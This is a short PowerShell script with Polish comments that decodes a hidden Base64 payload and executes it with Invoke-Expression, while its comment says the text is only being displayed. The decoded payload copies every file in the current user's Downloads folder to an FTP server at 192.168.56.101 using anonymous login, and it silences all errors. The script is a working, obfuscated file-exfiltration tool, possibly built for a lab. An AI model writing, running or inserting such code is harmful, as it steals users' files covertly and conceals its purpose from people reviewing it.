﻿# Zakodowany ciąg Base64
$base64String = "JGZ0cFNlcnZlciA9ICJmdHA6Ly8xOTIuMTY4LjU2LjEwMSIKJHVzZXJuYW1lID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUuU3BsaXQoJ1wnKVsxXQokbG9jYWxGb2xkZXIgPSAiQzpcVXNlcnNcJHVzZXJuYW1lXERvd25sb2FkcyIKJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKJGNsaWVudC5DcmVkZW50aWFscyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCgiYW5vbnltb3VzIiwgImFub255bW91cyIpCgokZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRsb2NhbEZvbGRlcgoKZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7CiAgICAkZnRwRmlsZVBhdGggPSAiJGZ0cFNlcnZlci91cGxvYWRzLyQoJGZpbGUuTmFtZSkiCiAgICAKICAgIHRyeSB7CiAgICAgICAgJGxvY2FsRmlsZVBhdGhXaXRoVXNlciA9ICIkbG9jYWxGb2xkZXJcJCgkZmlsZS5OYW1lKSIKICAgICAgICAkY2xpZW50LlVwbG9hZEZpbGUoJGZ0cEZpbGVQYXRoLCAiU1RPUiIsICRsb2NhbEZpbGVQYXRoV2l0aFVzZXIpCiAgICB9IGNhdGNoIHsKICAgICAgICAjdGVzdAogICAgfQp9"

# Dekodowanie Base64
$decodedBytes = [System.Convert]::FromBase64String($base64String)

# Konwersja bajtów na tekst
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

# Wyświetlenie odszyfrowanego tekstu
Invoke-Expression $decodedString